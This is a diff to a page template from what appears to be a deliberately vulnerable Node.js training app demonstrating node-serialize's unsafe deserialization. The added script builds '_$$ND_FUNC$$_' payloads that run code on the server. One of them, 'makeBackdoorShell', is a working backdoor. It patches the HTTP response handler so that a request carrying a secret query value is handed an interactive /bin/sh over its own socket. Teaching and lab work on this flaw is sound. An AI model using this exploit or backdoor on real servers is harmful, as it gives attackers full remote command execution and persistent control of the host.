@@ -6,14 +6,118 @@
 	<div class="col-xs-12 col-sm-6" style="padding-bottom: 30px;">
 		<h4 class="sub-header">Unsafe Eval from node-serializer</h4>
 		<form method="POST" action="/serialization/node-serialize">
+
 			<div class="form-group">
 				<label for="name">NAME: </label>
-				<input name="name" class="form-control" id="name" placeholder="Your Name" value="_$$ND_FUNC$$_console.log('........\nHello!\n........')">
+				<input name="name" class="form-control" id="name" placeholder="Your Name" value="Homer">
 			</div>
 			<button type="submit" class="btn btn-default">Submit</button>
-		</form>
 
+			<br/>
+			<br/>
+
+			<a style="cursor:pointer" id="console-log">Execute `console.log`</a>
+			&nbsp;&nbsp;
+			<a style="cursor:pointer;font-size:8pt;color:#568956;" id="show-console-log">(Show/Hide Code)</a>
+
+			<pre style="display:none;width:800px;" id="console-log-text"></pre>
+
+			<br/>
+			<br/>
+
+			<a style="cursor:pointer" id="setup-back-door">Create Back Door</a>
+			&nbsp;&nbsp;
+			<a style="cursor:pointer;font-size:8pt;color:#568956;" id="show-setup-back-door">(Show/Hide Code)</a>
+
+			<pre style="display:none;width:800px;" id="setup-back-door-text"></pre>
+
+		</form>
 	</div>
 </div>
 
 <% include ../../../views/partials/footer %>
+
+<script type="text/javascript">
+
+ $('#setup-back-door')
+ .on('click', function ( ) {
+	 var executable = '_$$ND_FUNC$$_(' + makeBackdoorShell.toString() + '())';
+	 console.log(executable);
+	 $('[name="name"]').val(executable);
+ });
+
+ $('#show-setup-back-door')
+ .on('click', (function ( offOn ){
+	 return function ( ) {
+		 if (offOn) {
+			 $('#setup-back-door-text').html(makeBackdoorShell.toString());
+			 $('#setup-back-door-text').show(); }
+
+		 else {
+			 $('#setup-back-door-text').text('');
+			 $('#setup-back-door-text').hide(); }
+
+		 offOn = offOn ? 0 : 1;
+	 };
+ }(1)));
+
+ $('#console-log')
+ .on('click', function ( ) {
+	 var executable = '_$$ND_FUNC$$_(' + consoleLog.toString() + '())';
+	 console.log(executable);
+	 $('[name="name"]').val(executable);
+ });
+
+ $('#show-console-log')
+ .on('click', (function ( offOn ){
+	 return function ( ) {
+		 if (offOn) {
+			 $('#console-log-text').html(consoleLog.toString());
+			 $('#console-log-text').show(); }
+
+		 else {
+			 $('#console-log-text').text('');
+			 $('#console-log-text').hide(); }
+
+		 offOn = offOn ? 0 : 1;
+	 };
+ }(1)));
+
+ // This is code that just logs to stdout in the server process
+ function consoleLog ( ) {
+	 console.log('........\nHello!\n````````');
+ }
+
+ // This is code that would create a way to
+ //  get back-door shell, if executed on the server.
+ function makeBackdoorShell ( ) {
+	 require('http').ServerResponse.prototype.end = (function ( end ) {
+		 return function ( ) {
+			 if (this.socket._httpMessage.req.query.q === 'abc123') {
+
+				 console.log('YOU\'RE FUCKED!!!');
+				 console.log('HAHAHAHAHAHAHAHA');
+
+				 ['close',
+				  'connect',
+				  'data',
+				  'drain',
+				  'end',
+				  'error',
+				  'lookup',
+				  'timeout',
+				  ''].forEach(this.socket.removeAllListeners.bind(this.socket));
+				 var cp = require('child_process');
+				 var net = require('net');
+				 var sh = cp.spawn('/bin/sh');
+				 sh.stdout.pipe(this.socket);
+				 sh.stderr.pipe(this.socket);
+				 this.socket.pipe(sh.stdin);
+			 } else {
+				 end.apply(this, arguments);
+			 }
+		 }
+	 })(require('http').ServerResponse.prototype.end);
+ }
+ 
+</script>
